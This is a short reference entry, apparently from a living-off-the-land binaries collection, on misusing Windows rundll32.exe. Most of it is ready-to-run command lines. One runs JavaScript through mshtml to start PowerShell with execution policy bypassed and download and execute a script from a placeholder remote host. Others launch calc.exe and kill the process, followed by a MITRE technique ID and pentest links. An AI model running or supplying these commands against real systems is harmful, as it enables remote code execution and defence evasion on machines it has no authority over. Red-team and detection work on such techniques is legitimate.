## Rundll32.exe
```

rundll32.exe AllTheThingsx64,EntryPoint
AllTheThingsx64 would be a .DLL file and EntryPoint would be the name of the entry point in the .DLL file to execute.

rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run(powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString("http://ip:port/");
Use Rundll32.exe to execute a JavaScript script that runs a PowerShell script that is downloaded from a remote web site.

rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new%20ActiveXObject(\"WScript.Shell\");w.run(\"calc\");window.close()");
Use Rundll32.exe to execute a JavaScript script that runs calc.exe.

rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").run("calc.exe",0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}
Use Rundll32.exe to execute a JavaScript script that runs calc.exe and then kills the Rundll32.exe process that was started.
```
* Windows binary: True   
* Bypasses Default AppLocker Rules: False   
* Mitre: [T1085](https://attack.mitre.org/wiki/Technique/T1085)   
   
* Links:   
  * https://pentestlab.blog/2017/05/23/applocker-bypass-rundll32/
  * https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_7
  * https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/
  * https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/
   
* File path:   
  * C:\Windows\System32\rundll32.exe
  * C:\Windows\SysWOW64\rundll32.exe
   
* Acknowledgement:   
  * Name: Casey Smith
    * Twitter: [@Subtee](https://twitter.com/@Subtee)
    * Blog: https://subt0x11.blogspot.com/
   
OS:  
- [x] Windows 10 1703
